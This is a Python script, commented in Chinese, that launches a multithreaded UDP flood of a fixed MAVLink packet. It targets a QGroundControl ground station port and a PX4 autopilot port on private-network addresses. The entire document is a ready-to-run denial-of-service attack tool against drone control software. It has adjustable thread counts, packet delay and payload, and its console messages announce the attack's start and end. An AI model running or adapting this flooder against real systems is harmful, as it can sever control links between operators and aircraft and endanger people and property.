import socket
import threading
import time

# === 攻击目标配置 ===
TARGETS = [
    ("192.168.234.1", 14550),  # QGC 接收 MAVLink（首要攻击目标）
    ("192.168.234.129", 18570),  # PX4 MAVLink 接收端口
]

# MAVLink 报文（可自定义）
HEX_PAYLOAD = 'fd200000a6ffbe4c00000000000000000000000000000000000000000000000000000000204116000101ce28'
BIN_PAYLOAD = bytes.fromhex(HEX_PAYLOAD)

# 攻击线程数
THREAD_COUNT_PER_TARGET = 10

# 是否延迟（模拟非极限流量，可改为 0）
DELAY_BETWEEN_PACKETS = 0.001

running = True

def attack_target(ip, port, tid):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect((ip, port))
    sent = 0

    while running:
        try:
            sock.sendall(BIN_PAYLOAD)
            sent += 1
            if DELAY_BETWEEN_PACKETS > 0:
                time.sleep(DELAY_BETWEEN_PACKETS)
        except Exception as e:
            print(f"[T{tid}] Error sending to {ip}:{port} -> {e}")
            break

    sock.close()
    print(f"[T{tid}] Stopped. Sent {sent} packets to {ip}:{port}")

threads = []

try:
    print(f"[INFO] 正在发起攻击，目标数量：{len(TARGETS)}，每个目标 {THREAD_COUNT_PER_TARGET} 个线程。按 Ctrl+C 停止。\n")
    tid = 0
    for ip, port in TARGETS:
        for i in range(THREAD_COUNT_PER_TARGET):
            t = threading.Thread(target=attack_target, args=(ip, port, tid))
            t.start()
            threads.append(t)
            tid += 1

    while True:
        time.sleep(1)

except KeyboardInterrupt:
    print("\n[INFO] 停止攻击中...")
    running = False
    for t in threads:
        t.join()

    print("[INFO] 所有线程已退出，攻击结束。")
